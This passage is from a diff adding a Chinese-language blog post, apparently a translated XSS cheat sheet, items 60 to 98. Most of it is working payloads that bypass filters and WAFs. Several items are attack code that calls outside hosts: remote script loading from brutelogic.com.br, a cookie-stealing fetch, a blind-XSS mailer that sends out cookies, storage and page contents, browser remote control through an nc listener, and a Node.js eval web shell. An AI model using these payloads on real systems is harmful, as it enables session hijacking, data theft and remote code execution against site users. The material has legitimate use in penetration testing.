this!</span><br></pre></td></tr></table></figure>
+
+<p><strong>60.Mixed Context Reflection Entity Bypass (反射实体混合上下文绕过)</strong></p>
+<p>以下payload用于在实际有效的js代码中的脚本块中转换特定的代码。它需要以在<code>HTML</code>和<code>javascript</code>上下文标签这种顺序执行，并且相关联彼此。</p>
+<p>这个<code>svg</code>标记将使下一个脚本块中的单引号编码为<code>&#39;</code>或<code>&#39;</code>，并触发弹窗。</p>
+<p>以下javascript场景的payload，分别为：</p>
+<p>消除单引号、完全转义单引号、消除双引号和完全转义双引号</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&#x27;-alert(1)-&#x27;&lt;svg&gt;</span><br><span class="line">&quot;&gt;&amp;#39-alert(1)-&amp;#39&lt;svg&gt;</span><br><span class="line">&quot;&gt;alert(1)-&quot;&lt;svg&gt;</span><br><span class="line">&quot;&amp;#34&gt;alert(1)-&amp;#34&lt;svg&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>61.Strip-My-Script Vector (去除脚本向量)</strong></p>
+<p>以下payload用于欺骗xss过滤器,用于去除最经典和最知名的XSS payload,它的工作原理是<code>&quot;&lt;script&gt;&quot;</code>标签被删除。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/on&lt;script&gt;&lt;script&gt;load=alert(1)//&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>62.Javascript Alternative Comments (Javascript注释替代)</strong></p>
+<p>以下payload用于,当不允许、转义或删除常规javascript注释（&#x2F;&#x2F;）时使用。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">%0A--&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>63.JS Lowercased Input (javascript小写输入)</strong></p>
+<p>以下payload用于当目标应用程序通过javascript将输入转换为小写时使用。它也可以用于服务器端的小写操作。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;SCRİPT&gt;alert(1)&lt;/SCRİPT&gt;</span><br><span class="line">&lt;SCRİPT/SRC=data:,alert(1)&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>64.Overlong UTF-8 (超长UTF-8)</strong></p>
+<p>以下payload用于当目标应用程序执行最佳匹配标签时使用。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%CA%BA&gt;%EF%BC%9Csvg/onload%EF%BC%9Dalert%EF%BC%881)&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>65.Vectors Exclusive for ASP Pages (ASP网页专用payload)</strong></p>
+<p>以下payload用于绕过<code>.asp</code>页中的<code>&lt;[alpha]</code>筛选。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">%u003Csvg onload=alert(1)&gt;</span><br><span class="line">%u3008svg onload=alert(2)&gt;</span><br><span class="line">%uFF1Csvg onload=alert(3)&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>66.PHP Email Validation Bypass (PHP电子邮件验证绕过)</strong></p>
+<p>以下payload用于绕过PHP的<code>FILTER_var()</code>函数的<code>FILTER_VALIDATE_EMAIL</code>(筛选验证电子邮件)标志。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;svg/onload=alert(1)&gt;&quot;@x.y</span><br></pre></td></tr></table></figure>
+
+<p><strong>67.PHP URL Validation Bypass (PHP URL验证绕过)</strong></p>
+<p>以下payload用于绕过PHP的<code>FILTER_var()</code>函数的<code>FILTER_VALIDATE_EMAIL</code>(筛选验证电子邮件)标志。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript://%250Aalert(1)</span><br></pre></td></tr></table></figure>
+
+<p><strong>68.PHP URL Validation Bypass – Query Required (PHP URL验证绕过-需要查询)</strong></p>
+<p>以下payload用于绕过PHP需要筛选标志查询(<code>FILTER_FLAG_QUERY_REQUIRED</code>),筛选验证电子邮件(<code>FILTER_VALIDATE_EMAIL</code>)的<code>filter_var()</code>函数。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">javascript://%250Aalert(1)//?1</span><br><span class="line">javascript://%250A1?alert(1):0</span><br><span class="line">(with domain filter)</span><br><span class="line">javascript://https://DOMAIN/%250A1?alert(1):0</span><br></pre></td></tr></table></figure>
+
+<p><strong>69.DOM Insertion via Server Side Reflection (通过服务器端反射插入DOM)</strong></p>
+<p>以下payload用于,当输入被反射到源中而不能执行时使用,为了避免浏览器筛选和<code>WAF</code>,插入到<code>DOM</code>中。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\74svg o\156load\75alert\501\51\76</span><br></pre></td></tr></table></figure>
+
+<p><strong>70.XML-Based Vector for Bypass (基于XML的绕过)</strong></p>
+<p>以下payload用于在XML网页中绕过浏览器筛选和WAF。</p>
+<p>如果输入插入到了注释节点中，则在payload前加一个”-&gt;”，如果输入落在<code>CDATA</code>节中，则在有效负载前加一个<code>]]&gt;</code>。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;_:script xmlns:_=&quot;http://www.w3.org/1999/xhtml&quot;&gt;alert(1)&lt;/_:script&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>71.Javascript Context - Code Injection (IE11&#x2F;Edge Bypass) (Javascript上下文-代码注入（IE11&#x2F;Edge 绕过）)</strong></p>
+<p>以下payload用于在注入javascript上下文时,绕过<code>Microsoft IE11</code>或<code>Edge</code>浏览器。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&#x27;&gt;confirm&amp;lpar;1)&lt;/Script&gt;&lt;Svg&gt;&lt;Script/1=&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><strong>72.Javascript Pseudo-Protocol Obfuscation (Javascript伪协议混淆)</strong></p>
+<p>以下payload用于绕过查找<code>javascript:alert(1)</code>的筛选器。在添加<code>alert(1)</code>之前，请确保它可以与”1”成功弹窗,这个payload可能需要一些额外的模糊处理,通过url编码,才能完全绕过过滤器。最后一个选项仅适用于payload的<code>DOM</code>操作（例如在基于位置的payload或基于<code>DOM</code>的XSS中）。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">javas&amp;#99ript:1</span><br><span class="line">javascript&amp;colon;1</span><br><span class="line">javascript&amp;#9:1</span><br><span class="line">&amp;#1javascript:1</span><br><span class="line">&quot;javas%0Dcript:1&quot;</span><br><span class="line">%00javascript:1</span><br></pre></td></tr></table></figure>
+
+<p><strong>73.AngularJS Injection (v1.6+) – No Parentheses, Brackets or Quotes (AngularJS注入-无括号、括号或引号)</strong></p>
+<p>以下payload用于避免xss过滤。第一,二个payload为了避免括号,最后一个payload,通过在URL中通正确编码,在相同或分离的注入点中使用它来避免引号。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;$new.constructor&amp;#40&#x27;alert\u00281\u0029&#x27;&amp;#41&amp;#40&amp;#41&#125;&#125;</span><br><span class="line">&amp;#123&amp;#123$new.constructor(&#x27;alert(1)&#x27;)()&amp;#125&amp;#125</span><br><span class="line">&lt;x ng-init=a=&#x27;alert(1)&#x27;&gt;&#123;&#123;$new.constructor(a)()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>74.Inside Comments Bypass (内部评论绕过)</strong></p>
+<p>如果HTML注释中允许任何内容，则使用payload<code>（regex:/&lt;！--.*--&gt;/)</code>.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--&gt;&lt;svg onload=alert(1)--&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>75.Agnostic Event Handlers Vectors – Native Script Based (未知事件处理程序向量-基于本机脚本)</strong></p>
+<p>以下带有事件处理程序的payload，可以与任意标记名一起使用，这有助于绕过黑名单检测。它们需要在注入之后在页面中加载一些脚本。请记住，在下面的处理程序中使用诸如<code>&quot;&lt;b&quot;</code>之类的现有标记名,可能是在某些情况下触发xss的唯一方法。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;x onafterscriptexecute=alert(1)&gt;</span><br><span class="line">&lt;x onbeforescriptexecute=alert(1)&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>76.Agnostic Event Handlers Vectors – CSS3 Based (未知事件处理程序向量——基于CSS3)</strong></p>
+<p>以下带有带有事件处理程序的向量，可以与任意标记名一起使用，这有助于绕过黑名单。它们需要<code>&lt;style&gt;</code>标签,或使用<code>&lt;link</code>&gt;标签导入样式表。最后<br>四个payload只适用于火狐。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;x onanimationend=alert(1)&gt;&lt;style&gt;x&#123;animation:s&#125;@keyframes s&#123;&#125;</span><br><span class="line">&lt;x onanimationstart=alert(1)&gt;&lt;style&gt;x&#123;animation:s&#125;@keyframes s&#123;&#125;</span><br><span class="line">&lt;x onwebkitanimationend=alert(1)&gt;&lt;style&gt;x&#123;animation:s&#125;@keyframes s&#123;&#125;</span><br><span class="line">&lt;x onwebkitanimationstart=alert(1)&gt;&lt;style&gt;x&#123;animation:s&#125;@keyframes s&#123;&#125;</span><br><span class="line">&lt;x ontransitionend=alert(1)&gt;&lt;style&gt;*&#123;transition:color 1s&#125;*:hover&#123;color:red&#125;</span><br><span class="line">&lt;x ontransitionrun=alert(1)&gt;&lt;style&gt;*&#123;transition:color 1s&#125;*:hover&#123;color:red&#125;</span><br><span class="line">&lt;x ontransitionstart=alert(1)&gt;&lt;style&gt;*&#123;transition:color 1s&#125;*:hover&#123;color:red&#125;</span><br><span class="line">&lt;x ontransitioncancel=alert(1)&gt;&lt;style&gt;*&#123;transition:color 1s&#125;*:hover&#123;color:red&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>77.Remote Script Call (远程脚本调用)</strong></p>
+<p>以下payload用于当需要调用外部脚本,但XSS向量是基于web应用处理程序的脚本时使用(如<code>&lt;svg onload=</code>)或通过javascript注入</p>
+<p>“brutelogic.com.br”域和HTML,js文件为例。如果以某种方式过滤<code>&quot;&gt;&quot;</code>，请将<code>&quot;r=&gt;&quot;</code>或<code>&quot;w=&gt;&quot;</code>替换为 <code>&quot;function()&quot;</code>。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">=&gt; HTML-based</span><br><span class="line">(response must be HTML with an Access-Control-Allow-Origin (CORS) header)</span><br><span class="line">&quot;var x=new XMLHttpRequest();x.open(&#x27;GET&#x27;,&#x27;//brutelogic.com.br/0.php&#x27;);x.send();</span><br><span class="line">x.onreadystatechange=function()&#123;if(this.readyState==4)&#123;write(x.responseText)&#125;&#125;&quot;</span><br><span class="line">fetch(&#x27;//brutelogic.com.br/0.php&#x27;).then(r=&gt;&#123;r.text().then(w=&gt;&#123;write(w)&#125;)&#125;)</span><br><span class="line"></span><br><span class="line">(with fully loaded JQuery library)</span><br><span class="line">$.get(&#x27;//brutelogic.com.br/0.php&#x27;,r=&gt;&#123;write(r)&#125;)</span><br><span class="line"></span><br><span class="line">=&gt; Javascript-based</span><br><span class="line">(response must be javascript)</span><br><span class="line">with(document)body.appendChild(createElement(&#x27;script&#x27;)).src=&#x27;//brutelogic.com.br/2.js&#x27;</span><br><span class="line"></span><br><span class="line">(with fully loaded JQuery library)</span><br><span class="line">$.getScript(&#x27;//brutelogic.com.br/2.js&#x27;)</span><br><span class="line">(CORS and js extension required)</span><br><span class="line">import(&#x27;//domain/file&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p><strong>78.Invisible Foreign XSS Embedding (不可见的外部XSS嵌入)</strong></p>
+<p>以下payload用于将XSS从另一个域（或子域）加载到当前域中。受限于目标域的<code>X-Frame-Options（XFO）</code>头文件。</p>
+<p>下面是<code>brutelogic.com.br</code>上下文中的弹窗示例,不分域名。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=&quot;//brutelogic.com.br/xss.php?a=&lt;svg onload=alert(document.domain)&gt;&quot;</span><br><span class="line">style=display:none&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>79.Simple Virtual Defacement (简单的虚假网页信息)</strong></p>
+<p>以下payload用于更改网站HTML代码的显示方式。在下面的例子中显示”Not Found”消息。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">documentElement.innerHTML=&#x27;&lt;h1&gt;Not Found&lt;/h1&gt;&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><strong>80.Blind XSS Mailer (xss邮件盲打)</strong></p>
+<p>以下payload将其于远程XSS盲打脚本，另存为PHP文件并更改<code>$to</code>和<code>$headers</code>变量</p>
+<p>因此。需要一台Postfix这样的工作邮件服务器。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php header(&quot;Content-type: application/javascript&quot;); ?&gt;</span><br><span class="line">var mailer = &#x27;&lt;?= &quot;//&quot; . $_SERVER[&quot;SERVER_NAME&quot;] . $_SERVER[&quot;REQUEST_URI&quot;] ?&gt;&#x27;;</span><br><span class="line">var msg = &#x27;USER AGENT\n&#x27; + navigator.userAgent + &#x27;\n\nTARGET URL\n&#x27; + document.URL;</span><br><span class="line">msg += &#x27;\n\nREFERRER URL\n&#x27; + document.referrer + &#x27;\n\nREADABLE COOKIES\n&#x27; +</span><br><span class="line">document.cookie;</span><br><span class="line">msg += &#x27;\n\nSESSION STORAGE\n&#x27; + JSON.stringify(sessionStorage) + &#x27;\n\nLOCAL</span><br><span class="line">STORAGE\n&#x27; + JSON.stringify(localStorage);</span><br><span class="line">msg += &#x27;\n\nFULL DOCUMENT\n&#x27; + document.documentElement.innerHTML;</span><br><span class="line">var r = new XMLHttpRequest();</span><br><span class="line">r.open(&#x27;POST&#x27;, mailer, true);</span><br><span class="line">r.setRequestHeader(&#x27;Content-type&#x27;, &#x27;application/x-www-form-urlencoded&#x27;);</span><br><span class="line">r.send(&#x27;origin=&#x27; + document.location.origin + &#x27;&amp;msg=&#x27; + encodeURIComponent(msg));</span><br><span class="line">&lt;?php</span><br><span class="line">header(&quot;Access-Control-Allow-Origin: &quot; . $_POST[&quot;origin&quot;]);</span><br><span class="line">$origin = $_POST[&quot;origin&quot;];</span><br><span class="line">$to = &quot;myName@myDomain&quot;;</span><br><span class="line">$subject = &quot;XSS Blind Report for &quot; . $origin;</span><br><span class="line">$ip = &quot;Requester: &quot; . $_SERVER[&quot;REMOTE_ADDR&quot;] . &quot;\nForwarded For: &quot;.</span><br><span class="line">$_SERVER[&quot;HTTP_X_FORWARDED_FOR&quot;];</span><br><span class="line">$msg = $subject . &quot;\n\nIP ADDRESS\n&quot; . $ip . &quot;\n\n&quot; . $_POST[&quot;msg&quot;];</span><br><span class="line">$headers = &quot;From: report@myDomain&quot; . &quot;\r\n&quot;;</span><br><span class="line">if ($origin &amp;&amp; $msg) mail($to, $subject, $msg, $headers);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>81.Browser Remote Control (浏览器远程控制)</strong></p>
+<p>以下payload用于监控浏览器并以交互方式,向其发送javascript命令。注入下面的javascript代码而不是<code>alert(1)</code>，会打开一个类似Unix的终端，使用下面的shell脚本（监听器）。将主机的主机名、IP地址或域名提供给从攻击者机器,然后接收命令去执行。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">=&gt; Javascript (payload):</span><br><span class="line">setInterval(function()&#123;with(document)body.</span><br><span class="line">appendChild(createElement(&#x27;script&#x27;)).src=&#x27;//HOST:5855&#x27;&#125;,100)</span><br><span class="line"></span><br><span class="line">=&gt; Listener (terminal command):</span><br><span class="line">$ while :; do printf &quot;j$ &quot;; read c; echo $c | nc -lp 5855 &gt;/dev/null; done</span><br></pre></td></tr></table></figure>
+
+<p><strong>82.Node.js Web Shell (Node.js web后门)</strong></p>
+<p>以下payload用于在易受攻击的Node.js应用程序中创建web后门,在运行下面的有效负载之后，按以下方式使用shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell:http://target:5855/?cmd=my_node.js_command</span><br></pre></td></tr></table></figure>
+
+<p>弹出计算示例：<code>cmd=require(&#39;child_process&#39;).exec(&#39;gnome-calculator&#39;)</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">require(&#x27;http&#x27;).createServer(function(req,res)&#123;res.end(1-</span><br><span class="line">eval(require(&#x27;url&#x27;).parse(req.url,1).query.cmd))&#125;).listen(5855)</span><br></pre></td></tr></table></figure>
+
+<p><strong>83.Cookie Stealing (窃取cookie信息)</strong></p>
+<p>用于从目标站点设置的受害者用户获取所有cookie。如果无法通过<code>httpOnly</code>安全标志。则在URL中将”+”编码为”%2B”</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fetch(&#x27;//brutelogic.com.br/?c=&#x27;+document.cookie)</span><br></pre></td></tr></table></figure>
+
+<p><strong>84.XSS Online Test Page (XSS在线测试页面)</strong></p>
+<p>以下地址用于练习XSS向量和有效载荷。检查注入点的源代码。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://brutelogic.com.br/xss.php</span><br></pre></td></tr></table></figure>
+
+<p><strong>85.HTML Entities Table (HTML实体表)</strong></p>
+<p>用于HTML编码字符。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://brutelogic.com.br/utils/charref.htm</span><br></pre></td></tr></table></figure>
+
+<p><strong>85.Multi-Case HTML Injection (多案例HTML注入)</strong></p>
+<p>以下payload可作为一次测试机会，它有更高的成功XSS率。它适用于HTML上下文的所有情况（参见基础部分），包括带有标记注入的JS上下文。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;/Script/&quot;&#x27;--&gt;&lt;Body /Autofocus /OnFocus = confirm`1` &lt;!--&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>86.Multi-Case HTML Injection - Base64 (多案例HTML注入-Base64)</strong></p>
+<p>以下payload,在Base64编码以后中作为一次测试机会,可获得更高的XSS成功率。它适用于HTML上下文的所有情况（参见基础部分），包括带有标记注入的JS上下文。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PC9TY3JpcHQvIictLT48Qm9keSAvQXV0b2ZvY3VzIC9PbkZvY3VzID0gY29uZmlybWAxYC</span><br><span class="line">A8IS0tPg==</span><br></pre></td></tr></table></figure>
+
+<p><strong>87.Vectors for Fixed Input Length (固定输入长度的payload)</strong></p>
+<p>以下payload在输入必须具有固定长度时使用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">MD5    12345678901 &lt;svg/onload=alert(1)&gt;</span><br><span class="line">SHA1   1234567890123456789 &lt;svg/onload=alert(1)&gt;</span><br><span class="line">SHA256 1234567890123456789012345678901234567890123 &lt;svg/onload=alert(1)&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>88.PHP Sanitizing for XSS (PHP xss过滤)</strong></p>
+<p>以下代码只用于阻止每个上下文中的xss，只要输入不返回在非分隔字符串、反勾号中间或任何其他类似于<code>eval</code>的函数（JS上下文中的所有函数）中。但是它不防止基于DOM的XSS，只防止基于源代码的XSS。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$input = preg_replace(&quot;/:|\\\/&quot;, &quot;&quot;, htmlentities($input, ENT_QUOTES))</span><br></pre></td></tr></table></figure>
+
+<p><strong>89.JavaScript Execution Delay (javascript执行延迟)</strong></p>
+<p>以下payload基于JQuery的外部调用为例,当javascript库或任何其他需要注入的资源,在payload的执行中未完全加载时使用。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">onload=function()&#123;$.getScript(&#x27;//brutelogic.com.br/2.js&#x27;)&#125;</span><br><span class="line">onload=x=&gt;$.getScript(&#x27;//brutelogic.com.br/2.js&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p><strong>90.Image Vectors - Alternative Event Handlers (图像向量-可选事件处理程序)</strong></p>
+<p>以下payload用于触发事件处理程序,不同于<code>onerror</code>事件。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;img</span><br><span class="line">&lt;image</span><br><span class="line">src=data:image/gif;base64,R0lGODlhAQABAAD/ACwAAAAAAQABAAACADs=</span><br><span class="line">srcset=data:image/gif;base64,R0lGODlhAQABAAD/ACwAAAAAAQABAAACADs=</span><br><span class="line">onload=alert(1)&gt;</span><br><span class="line">onloadend=alert(1)&gt;</span><br><span class="line">onloadstart=alert(1)&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>91.Shortest XSS (最短XSS)</strong></p>
+<p>当有一个有限xss漏洞利用点时。需要一个javascript脚本调用，通过相对路径放在xss需要加载的位置之后。攻击者服务器必须使用攻击脚本对本机脚本（相同路径）或默认404页（更容易）内完成的确切请求进行响应。域名越短越好。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;base href=//knoxss.me&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>92.Mobile-only Event Handlers (仅处理移动端应用)</strong></p>
+<p>以下payload,针对移动应用程序时使用。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;html ontouchstart=alert(1)&gt;</span><br><span class="line">&lt;html ontouchend=alert(1)&gt;</span><br><span class="line">&lt;html ontouchmove=alert(1)&gt;</span><br><span class="line">&lt;body onorientationchange=alert(1)&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>93.Body Tag (body 标签)</strong></p>
+<p>body标签的集合。最后一个只适用于<code>Internet Explorer</code>浏览器。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;body onload=alert(1)&gt;</span><br><span class="line">&lt;body onpageshow=alert(1)&gt;</span><br><span class="line">&lt;body onfocus=alert(1)&gt;</span><br><span class="line">&lt;body onhashchange=alert(1)&gt;&lt;meta content=URL;%23 http-equiv=refresh&gt;</span><br><span class="line">&lt;body onscroll=alert(1) style=overflow:auto;height:1000px id=x&gt;#x</span><br><span class="line">&lt;body onscroll=alert(1)&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;x id=x&gt;#x</span><br><span class="line">&lt;body onresize=alert(1)&gt;press F12!</span><br><span class="line">&lt;body onhelp=alert(1)&gt;press F1!</span><br></pre></td></tr></table></figure>
+
+<p><strong>94.Less Known XSS Vectors (未知的XSS向量)</strong></p>
+<p>未知的XSS向量的集合。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;marquee onstart=alert(1)&gt;</span><br><span class="line">&lt;audio src onloadstart=alert(1)&gt;</span><br><span class="line">&lt;video onloadstart=alert(1)&gt;&lt;source&gt;</span><br><span class="line">&lt;video ontimeupdate=alert(1) controls src=//brutelogic.com.br/x.mp4&gt;</span><br><span class="line">&lt;input autofocus onblur=alert(1)&gt;</span><br><span class="line">&lt;keygen autofocus onfocus=alert(1)&gt;</span><br><span class="line">&lt;form onsubmit=alert(1)&gt;&lt;input type=submit&gt;</span><br><span class="line">&lt;select onchange=alert(1)&gt;&lt;option&gt;1&lt;option&gt;2</span><br><span class="line">&lt;menu id=x contextmenu=x onshow=alert(1)&gt;right click me!</span><br><span class="line">&lt;object onerror=alert(1)&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>95.Alternative PoC - Shake Your Body (非传统的xss payload)</strong></p>
+<p>以下payload用于摇动页面的所有元素，作为漏洞验证的良好可视化。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setInterval(x=&gt;&#123;b=document.body.style,b.marginTop=(b.marginTop==&#x27;4px&#x27;)?&#x27;-4px&#x27;:&#x27;4px&#x27;;&#125;,5)</span><br></pre></td></tr></table></figure>
+
+<p><strong>96.Alternative PoC - Brutality (非传统的xss payload)</strong></p>
+<p>以下payload用于显示”Mortal Kombat’s Sub-Zero”角色的图像以及”brutality”的游戏声音。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">d=document,i=d.createElement(&#x27;img&#x27;);i.src=&#x27;//brutelogic.com.br/brutality.jpg&#x27;;</span><br><span class="line">d.body.insertBefore(i,d.body.firstChild);new(Audio)(&#x27;//brutelogic.com.br/brutality.mp3&#x27;).play();</span><br></pre></td></tr></table></figure>
+
+<p><strong>97.Alternative PoC - Alert Hidden Values (非传统的xss payload)</strong></p>
+<p>以下payload用于证明所有隐藏的HTML值（如目标页面中的标记和<code>nonce</code>）都可以被窃取。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">f=document.forms;for(i=0;i&lt;f.length;i++)&#123;e=f[i].elements;for(n in e)&#123;if(e[n].type==&#x27;hidden&#x27;)</span><br><span class="line">&#123;alert(e[n].name+&#x27;: &#x27;+e[n].value)&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>98.Improved Likelihood of Mouse Events (提高鼠标事件的可能性)</strong></p>
+<p>以下payload用于创建要触发鼠标事件的更大区域范围。在任何使用鼠标事件（如<code>onmouseover</code>、<code>onclick</code>等）的XSS payload中添加以下内容（作为属性）。</p>
